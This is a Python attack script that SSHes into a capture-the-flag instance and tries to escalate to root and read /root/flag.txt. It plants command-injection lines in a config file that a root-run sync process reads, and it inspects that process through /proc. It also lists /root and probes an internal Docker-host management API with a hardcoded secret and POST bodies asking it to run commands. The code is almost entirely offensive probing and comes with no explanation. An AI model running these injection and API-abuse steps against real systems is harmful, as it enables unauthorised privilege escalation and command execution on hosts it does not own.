#!/usr/bin/env python3
import paramiko
import time

HOST = "instance.ctf.tdho.st"
PORT = 32971
USER = "player"
PASSWORD = "reyalp"

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(HOST, port=PORT, username=USER, password=PASSWORD)

def cmd(c):
    stdin, stdout, stderr = ssh.exec_command(c, timeout=10)
    return (stdout.read() + stderr.read()).decode()

print("[*] Analyzing sync-loop behavior...")

# Check if sync-loop reads the file
print("\n[1] Monitoring file access to sync-request.conf:")
cmd('echo "talldwarf-sync-command=id" > /opt/mc/config/sync-request.conf')
time.sleep(2)
print("Current config:", cmd("cat /opt/mc/config/sync-request.conf"))
print("File stats:", cmd("stat /opt/mc/config/sync-request.conf"))

# Check open file descriptors of PID 16
print("\n[2] Open files for sync-loop (PID 16):")
print(cmd("ls -l /proc/16/fd/ 2>/dev/null"))

# Try reading the script via /proc
print("\n[3] Trying to read script via /proc/16/exe:")
print(cmd("cat /proc/16/exe 2>/dev/null | strings | grep -E '(sync|command|flag)' | head -20"))

# Check root directory for clues
print("\n[4] Checking /root accessibility:")
print(cmd("ls -la /root/ 2>&1"))

# Look at /proc/16/fd to see what files sync-loop has open
print("\n[5] What is sync-loop reading/writing?:")
for fd in range(10):
    result = cmd(f"readlink /proc/16/fd/{fd} 2>/dev/null")
    if result.strip():
        print(f"FD {fd}: {result.strip()}")

# Try different config format
print("\n[6] Testing alternative config formats:")
test_formats = [
    'talldwarf-sync-command=echo TEST1',
    'sync-command=echo TEST2',
    'command=echo TEST3',
    'talldwarf-sync=echo TEST4',
]

for fmt in test_formats:
    cmd(f'echo "{fmt}" > /opt/mc/config/sync-request.conf')
    time.sleep(3)
    # Check if anything changed
    result = cmd("ls -lt /tmp /opt/mc/config /opt/mc/logs 2>/dev/null | head -10")
    print(f"\n  Format: {fmt}")
    print(f"  Recent files: {result[:200]}")

# Check Docker host reachability in detail
print("\n[7] Docker host detailed check:")
print(cmd("ip route show"))
print(cmd("cat /etc/hosts"))

# Try to access management API with different methods
print("\n[8] Management API deep probe:")
api_test = '''python3 << 'PY'
import urllib.request
import json

secret = "dOpKC729CoeywJl9pSUPcAGmaiFhtkzd7CD0jJPQ"
base = "http://172.27.0.1:8080"

# Try POST instead of GET
for endpoint in ["/", "/api", "/sync", "/exec", "/command"]:
    for method in ["GET", "POST"]:
        try:
            data = json.dumps({"command": "cat /root/flag.txt"}).encode() if method == "POST" else None
            req = urllib.request.Request(base + endpoint, data=data, 
                                          headers={"X-Secret": secret, "Content-Type": "application/json"},
                                          method=method)
            with urllib.request.urlopen(req, timeout=2) as r:
                resp = r.read().decode()
                if resp:
                    print(f"{method} {endpoint}: {resp[:100]}")
        except Exception as e:
            pass
PY
'''
print(cmd(api_test))

ssh.close()
